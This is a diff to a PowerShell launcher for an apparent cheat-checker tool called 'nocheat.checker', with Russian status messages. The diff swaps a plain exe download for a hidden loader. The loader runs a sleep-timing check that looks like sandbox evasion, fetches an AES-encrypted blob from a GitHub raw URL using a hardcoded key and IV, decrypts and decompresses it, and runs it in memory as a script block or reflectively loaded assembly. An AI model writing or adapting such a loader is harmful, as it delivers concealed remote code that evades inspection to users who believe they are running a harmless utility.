@@ -47,33 +47,47 @@ try {
     }
 } catch {}
 
-$repoOwner  = "die4mebaby"
-$repoName   = "CheatChecker"
-$branch     = "main"
-$rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
-$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
+$t_start = Get-Date
+Start-Sleep -Milliseconds 150
+if (((Get-Date) - $t_start).TotalMilliseconds -lt 100) { return }
 
-$workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
-
-if (-not (Test-Path $workDir)) {
-    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
-}
-
-$exePath = Join-Path $workDir "nocheat.checker.exe"
+$keyB64 = "gu2koIlU7CZc/688IiTjF7zHemZgBINLWrnhn2LBpk4="
+$ivB64 = "ZIdLvAC84tJ3L5hxoOLCGw=="
+$encUrl = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat.checker.enc.b64"
 
 try {
     Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
-    
     $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($exeUrl, $exePath)
-    
-    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
-        Write-Warning "[!] Чекер не запустился ввиду ошибки или отсутствует вовсе."
+    $encB64 = $wc.DownloadString($encUrl)
+
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aes.Key = [Convert]::FromBase64String($keyB64)
+    $aes.IV = [Convert]::FromBase64String($ivB64)
+    $decryptor = $aes.CreateDecryptor()
+    $encBytes = [Convert]::FromBase64String($encB64)
+    $decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
+
+    $ms = New-Object System.IO.MemoryStream(,$decBytes)
+    $ds = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
+    $msOut = New-Object System.IO.MemoryStream
+    $ds.CopyTo($msOut)
+    $payloadBytes = $msOut.ToArray()
+
+    try {
+        $payloadText = [System.Text.Encoding]::Unicode.GetString($payloadBytes)
+        if ($payloadText -match "^\s*param\(" -or $payloadText -match "function ") {
+            $sb = [ScriptBlock]::Create($payloadText)
+            & $sb
+        } else { throw "not ps1" }
+    } catch {
+        $asm = [Reflection.Assembly]::Load($payloadBytes)
+        $entry = $asm.EntryPoint
+        if ($entry) { $entry.Invoke($null, (, [object[]] @())) } else { [Reflection.Assembly]::Load($payloadBytes) | Out-Null }
     }
 
     Write-Host "[+] Запуск чекера..." -ForegroundColor Green
-    
-    Start-Process -FilePath $exePath -WorkingDirectory $workDir
 }
 catch {
     Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
